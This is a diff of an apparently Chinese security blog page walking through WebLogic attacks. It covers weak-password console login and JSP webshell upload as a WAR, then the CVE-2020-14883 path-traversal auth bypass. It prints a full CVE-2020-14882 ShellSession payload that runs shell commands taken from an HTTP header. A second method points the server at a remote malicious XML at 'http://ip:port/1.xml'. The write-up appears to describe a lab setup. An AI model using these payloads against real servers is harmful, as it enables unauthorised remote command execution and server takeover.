+<p><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175509402.png" alt="image-20250506215751500" srcset="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175509402.png?size=small, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175509402.png?size=medium 1.5x, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175509402.png?size=large 2x" data-title="image-20250506215751500" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>只允许以 <code>java:</code> 开头的本地 JNDI 名称，远程的如 rmi，ldap 就不行了</p>
+<h3 id="小结" class="heading-element"><span>小结</span>
+  <a href="#%e5%b0%8f%e7%bb%93" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>限制比较大感觉，要进后台，漏洞本身的利用思路还是非常有趣的</p>
+<h3 id="参考" class="heading-element"><span>参考</span>
+  <a href="#%e5%8f%82%e8%80%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><a href="https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/"target="_blank" rel="external nofollow noopener noreferrer">https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/</a></p>
+<p><a href="https://y4er.com/posts/weblogic-cve-2021-2109-jndi-rce/"target="_blank" rel="external nofollow noopener noreferrer">https://y4er.com/posts/weblogic-cve-2021-2109-jndi-rce/</a></p>
+<h3 id="弱口令-getshell" class="heading-element"><span>弱口令 getshell</span>
   <a href="#%e5%bc%b1%e5%8f%a3%e4%bb%a4-getshell" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><h3 id="弱口令" class="heading-element"><span>弱口令</span>
+</h3><h4 id="弱口令" class="heading-element"><span>弱口令</span>
   <a href="#%e5%bc%b1%e5%8f%a3%e4%bb%a4" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h3><p>访问 WebLogic <code>/console</code> 接口，可能存在的弱口令如下</p>
+</h4><p>访问 WebLogic <code>/console</code> 接口，可能存在的弱口令如下</p>
 <table>
   <thead>
       <tr>
@@ -259,36 +406,36 @@
 </span></span><span class="line"><span class="cl">weblogic@</span></span></code></pre></td></tr></table>
 </div>
 </div><p>这里错误密码5次之后就会自动锁定，用 qax 搭建的这个环境的账户密码为：weblogic、qaxateam01</p>
-<h3 id="文件上传" class="heading-element"><span>文件上传</span>
+<h4 id="文件上传" class="heading-element"><span>文件上传</span>
   <a href="#%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h3><p>之后就在左边域结构处的部署那进行文件上传，点击安装后上传文件，随便弄个 jsp 木马，压缩成 zip 后改后缀为 war</p>
-<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682043ec67314.png" alt="image-20250505155237754" srcset="https://bu.dusays.com/2025/05/11/682043ec67314.png?size=small, https://bu.dusays.com/2025/05/11/682043ec67314.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682043ec67314.png?size=large 2x" data-title="image-20250505155237754" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+</h4><p>之后就在左边域结构处的部署那进行文件上传，点击安装后上传文件，随便弄个 jsp 木马，压缩成 zip 后改后缀为 war</p>
+<p><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617531.png" alt="image-20250505155237754" srcset="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617531.png?size=small, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617531.png?size=medium 1.5x, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617531.png?size=large 2x" data-title="image-20250505155237754" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>将文件传在上面那处</p>
-<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682043ec733e3.png" alt="image-20250505155306999" srcset="https://bu.dusays.com/2025/05/11/682043ec733e3.png?size=small, https://bu.dusays.com/2025/05/11/682043ec733e3.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682043ec733e3.png?size=large 2x" data-title="image-20250505155306999" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617557.png" alt="image-20250505155306999" srcset="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617557.png?size=small, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617557.png?size=medium 1.5x, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617557.png?size=large 2x" data-title="image-20250505155306999" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>然后一直点下一步，最后点完成，之后启动就能 getshell 了</p>
-<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682043ec68a4e.png" alt="image-20250505155551392" srcset="https://bu.dusays.com/2025/05/11/682043ec68a4e.png?size=small, https://bu.dusays.com/2025/05/11/682043ec68a4e.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682043ec68a4e.png?size=large 2x" data-title="image-20250505155551392" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682043ec62288.png" alt="image-20250505155735480" srcset="https://bu.dusays.com/2025/05/11/682043ec62288.png?size=small, https://bu.dusays.com/2025/05/11/682043ec62288.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682043ec62288.png?size=large 2x" data-title="image-20250505155735480" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h2 id="cve-2020-14882cve-2020-14883-未授权-rce" class="heading-element"><span>CVE-2020-14882/CVE-2020-14883 未授权 RCE</span>
+<p><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617563.png" alt="image-20250505155551392" srcset="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617563.png?size=small, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617563.png?size=medium 1.5x, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617563.png?size=large 2x" data-title="image-20250505155551392" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617565.png" alt="image-20250505155735480" srcset="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617565.png?size=small, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617565.png?size=medium 1.5x, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617565.png?size=large 2x" data-title="image-20250505155735480" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="cve-2020-14882cve-2020-14883-未授权-rce" class="heading-element"><span>CVE-2020-14882/CVE-2020-14883 未授权 RCE</span>
   <a href="#cve-2020-14882cve-2020-14883-%e6%9c%aa%e6%8e%88%e6%9d%83-rce" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h2><p>这里 rce 是在未授权的基础上进后台 rce 的，简单地介绍下两个漏洞</p>
+</h3><p>这里 rce 是在未授权的基础上进后台 rce 的，简单地介绍下两个漏洞</p>
 <ul>
 <li>CVE-2020-14883：允许未授权的用户通过目录穿越结合双重 URL 编码的方式来绕过管理控制台的权限验证访问后台。</li>
 <li>CVE-2020-14882：允许后台任意用户通过 HTTP 协议执行任意命令。</li>
 </ul>
-<h3 id="影响版本" class="heading-element"><span>影响版本</span>
+<h4 id="影响版本" class="heading-element"><span>影响版本</span>
   <a href="#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h3><p>Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0</p>
-<h3 id="cve-2020-14883" class="heading-element"><span>CVE-2020-14883</span>
+</h4><p>Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0</p>
+<h4 id="cve-2020-14883" class="heading-element"><span>CVE-2020-14883</span>
   <a href="#cve-2020-14883" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h3><p>直接访问 console 会跳转到 /console/login/LoginForm.jsp 进行登录，这里可以利用双重 url 编码+目录穿越进 console 后台，payload</p>
+</h4><p>直接访问 console 会跳转到 /console/login/LoginForm.jsp 进行登录，这里可以利用双重 url 编码+目录穿越进 console 后台，payload</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -297,17 +444,17 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/console/css/%252e%252e%252fconsole.portal</span></span></code></pre></td></tr></table>
 </div>
 </div><p>进去后很明显和之前弱口令进去的后台不一样，没有部署，无法上传恶意 war 包来拿 shell，接下来可以结合 CVE-2020-14882 来 getshell</p>
-<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682043ec9f880.png" alt="image-20250505172412953" srcset="https://bu.dusays.com/2025/05/11/682043ec9f880.png?size=small, https://bu.dusays.com/2025/05/11/682043ec9f880.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682043ec9f880.png?size=large 2x" data-title="image-20250505172412953" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h3 id="cve-2020-14882" class="heading-element"><span>CVE-2020-14882</span>
+<p><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617567.png" alt="image-20250505172412953" srcset="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617567.png?size=small, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617567.png?size=medium 1.5x, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617567.png?size=large 2x" data-title="image-20250505172412953" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h4 id="cve-2020-14882" class="heading-element"><span>CVE-2020-14882</span>
   <a href="#cve-2020-14882" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h3><p>在上述未授权进入的后台是低权限的情况下，可以利用 CVE-2020-14883 来打，有两种打法，一是用 <code>com.tangosol.coherence.mvel2.sh.ShellSession</code> 来直接 rce，二是用 <code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code> 加载恶意 xml 文件来 rce</p>
-<h4 id="方法一" class="heading-element"><span>方法一</span>
+</h4><p>在上述未授权进入的后台是低权限的情况下，可以利用 CVE-2020-14883 来打，有两种打法，一是用 <code>com.tangosol.coherence.mvel2.sh.ShellSession</code> 来直接 rce，二是用 <code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code> 加载恶意 xml 文件来 rce</p>
+<h5 id="方法一" class="heading-element"><span>方法一</span>
   <a href="#%e6%96%b9%e6%b3%95%e4%b8%80" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h4><p>利用的是 <code>com.tangosol.coherence.mvel2.sh.ShellSession</code> 类</p>
+</h5><p>利用的是 <code>com.tangosol.coherence.mvel2.sh.ShellSession</code> 类</p>
 <p>此利用方法只能在 Weblogic 12.2.1 及以上版本利用，因为低版本并不存在 <code>com.tangosol.coherence.mvel2.sh.ShellSession</code> 类</p>
 <p>payload1</p>
 <div class="highlight"><div class="chroma">
@@ -323,15 +470,15 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/console/css/%252e%252e%252fconsole.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(&#39;weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(&#34;connectionHandler&#34;);field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(&#34;getServletRequest&#34;).invoke(obj); String cmd = req.getHeader(&#34;cmd&#34;);String[] cmds = System.getProperty(&#34;os.name&#34;).toLowerCase().contains(&#34;window&#34;) ? new String[]{&#34;cmd.exe&#34;, &#34;/c&#34;, cmd} : new String[]{&#34;/bin/sh&#34;, &#34;-c&#34;, cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(&#34;\\A&#34;).next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(&#34;getResponse&#34;).invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/console/css/%252e%252e%252fconsole.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]{%22cmd.exe%22,%20%22/c%22,%20cmd}%20:%20new%20String[]{%22/bin/sh%22,%20%22-c%22,%20cmd};if(cmd%20!=%20null%20){%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();}%20currentThread.interrupt();</span></span></code></pre></td></tr></table>
 </div>
-</div><p>参数及参数值中的关键字需要url编码下，在 http 头添加 cmd 参数及其值即可 rce</p>
-<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682043ed993c5.png" alt="image-20250505174455535" srcset="https://bu.dusays.com/2025/05/11/682043ed993c5.png?size=small, https://bu.dusays.com/2025/05/11/682043ed993c5.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682043ed993c5.png?size=large 2x" data-title="image-20250505174455535" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h4 id="方法二" class="heading-element"><span>方法二</span>
+</div><p>在 http 头添加 cmd 参数及其值即可 rce</p>
+<p><img loading="lazy" src="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617580.png" alt="image-20250505174455535" srcset="https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617580.png?size=small, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617580.png?size=medium 1.5x, https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625175617580.png?size=large 2x" data-title="image-20250505174455535" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h5 id="方法二" class="heading-element"><span>方法二</span>
   <a href="#%e6%96%b9%e6%b3%95%e4%ba%8c" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h4><p>利用的是 <code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code></p>
+</h5><p>利用的是 <code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code></p>
 <p>从这个函数都可以看出来，加载恶意xml来rce，此利用方法无版本限制，但是需要出网，公网上放1.xml</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -374,23 +521,23 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&#34;http://ip:port/1.xml&#34;)</span></span></code></pre></td></tr></table>
 </div>
